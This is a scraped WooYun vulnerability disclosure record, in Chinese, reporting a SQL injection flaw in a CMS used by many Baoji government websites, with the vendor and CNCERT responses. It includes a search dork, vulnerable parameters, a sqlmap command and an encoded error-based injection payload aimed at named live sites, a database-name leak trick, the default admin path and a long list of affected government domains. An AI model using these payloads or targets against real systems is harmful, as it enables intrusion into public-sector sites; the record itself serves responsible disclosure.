{"id": 39469, "wybug_id": "wooyun-2015-093957", "wybug_title": "某网络公司开发的政务类CMS存在通用SQL注入漏洞", "wybug_corp": "宝鸡市世纪网络技术有限公司", "wybug_author": "onpu", "wybug_date": "2015-01-29 18:29", "wybug_open_date": "2015-04-29 18:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向公众公开  简要描述： 某网络公司开发的政务类CMS存在通用SQL注入漏洞 详细说明：  由宝鸡市世纪网络技术有限公司（http://www.bjsjwl.com）开发的某套CMS程序用于宝鸡市区多数政府网站，存在通用的sql注入。关键字：\"技术支持：宝鸡市世纪网络技术有限公司\" inurl:stage.php?do=\n\n   漏洞证明：  \n存在缺陷文件：stage.php、show_top.php、infor.php等注入参数：cid、upid、wid等\n\n网站的url进过改写的，改写成的类型为：infor.php?+参数，而不是stage.php?do=的类型，进行了更换后，正常显示，说明存在sql注入\n\n格式：url改写:http://127.0.0.1/infor.php?xxx原来:http://127.0.0.1/stage.php?do=votelist&cid=1\n以下就是举栗子警告：以下栗子是为了证明通用型，也给CNVD进行测试，勿用于非法用途或破坏，后果自负，谢谢。由于使用了注入过滤，无法直接注入，只能是进行中转注入用法如：\nsqlmap.py -u \"http://www.bjgqt.com/love/stage.php?do=wishdo\" --cookie \"wid=42\" --level 2\n\nhttp://www.bjgqt.com/love/stage.php?do=wishdo&wid=42http://www.bjzfgjj.com/stage.php?do=msgshow&id=3941http://www.weibin.gov.cn/show_top.php?upid=NSFTWhttp://mxcxjb.com/stage.php?do=votelist&cid=26http://www.bjjtjy.com/stage.php?do=msglistsum&fid=1http://www.lxczw.gov.cn/stage.php?do=voteinfor&cid=8http://www.bjqx.gov.cn/flashnews.php?fid=(select%201%20and%20row(1%2c1)>(select%20count(*)%2cconcat(concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(98)%2cCHAR(54)%2cCHAR(109)%2cCHAR(113)%2cCHAR(88)%2cCHAR(71)%2cCHAR(76)%2cCHAR(50))%2cfloor(rand()*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201))&h=180&len=32&num=8&w=260\n默认后台地址：网站url+/temple/\n\n在浏览网站的时候发现，网站的url默认的页面是：网站+/infor.php，如：\n\n只要我们在infor.php加上?/ 就是爆出网站的当前用户和数据库名词，如：\n\n其中前面的七位数就是数据库名称，而在后面加@%，就是当前用户。\nhttp://www.bjgqt.com/love/stage.php?do=wishdo&wid=42\n\n\n\n\n\n\n\nhttp://www.bjzfgjj.com/stage.php?do=msgshow&id=3941\n\n\n\nhttp://www.weibin.gov.cn/show_top.php?upid=NSFTW\n\n\n\nhttp://mxcxjb.com/stage.php?do=votelist&cid=26\n\n\n\nhttp://www.bjjtjy.com/stage.php?do=msglistsum&fid=1\n\n\nurl改写的：http://www.lxczw.gov.cn/infor.php?756，无法正常sql注入，可换会原来的类，http://www.lxczw.gov.cn/stage.php?do=voteinfor&cid=8，这样就可以注入了。\n\n\n存在sql注入的网站：http://www.nanzhihui.gov.cn/ 凤翔县南指挥镇人民政府http://www.ccqzfw.gov.cn/ 中共宝鸡市陈仓区委政法委员会http://www.sxfxcz.gov.cn 凤县财政局http://www.bjssyj.com  宝鸡市兽医局http://www.ccqzfw.gov.cn  中共宝鸡市陈仓区委政法委员会http://www.sxfx.gov.cn 凤县扶贫开发http://www.sxfx.gov.cn/ 凤县卫生局http://www.qyxsfw.com 千阳县书法协会http://www.qyjjw.gov.cn 千阳县纪律检查委员会http://www.qyjcy.gov.cn 千阳县检察院http://bjcjp.gov.cn 陕西省蔡家坡经济技术开发区管理委员会http://www.bjjtjy.com 宝鸡市金台区教育体育局http://www.jtgafj.gov.cn/ 宝鸡市公安局金台分局http://fengxiangzf.gov.cn/中共凤翔县委政法委员会http://www.wbxfj.com/ 渭滨区信访局http://www.jtcz.gov.cn/ 金台区财政局http://www.jtzj.gov.cn/金台区住房和城乡建设局（地震局）http://www.baojiwenguang.gov.cn 宝鸡市文化广电新闻出版局http://www.sxtb.gov.cn/ 太白县人民政府http://www.lyxxfj.com/麟游县信访局http://www.ccjcy.gov.cn/ 宝鸡市陈仓区人民检察院http://fxxf.gov.cn/ 凤县信访局http://www.fengxiang.gov.cn/ 中共凤翔县政府http://www.bjdpc.gov.cn/ 宝鸡市发展和改革委员会http://www.bjzfgjj.com/ 宝鸡市公积金管理中心http://weibin.gov.cn/ 渭滨区政府 http://www.sxfx.gov.cn/ 凤县人民政府http://www.fxjjw.gov.cn/ 凤县纪检监察网http://www.qianyang.gov.cn/ 千阳县人民政府http://sxfx.gov.cn/ 凤县人民政府http://www.lxkjxx.gov.cn/ 陇县科技局网站http://www.qyjjw.gov.cn/ 千阳纪检监察网http://www.fxxpop.gov.cn/ 凤翔县人口和计划生育局http://www.bjqx.gov.cn/ 宝鸡市气象局\n   修复方案：  修改缺陷文件，加强过滤。   版权声明：转载请注明来源 onpu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-03 14:52 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给陕西分中心，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}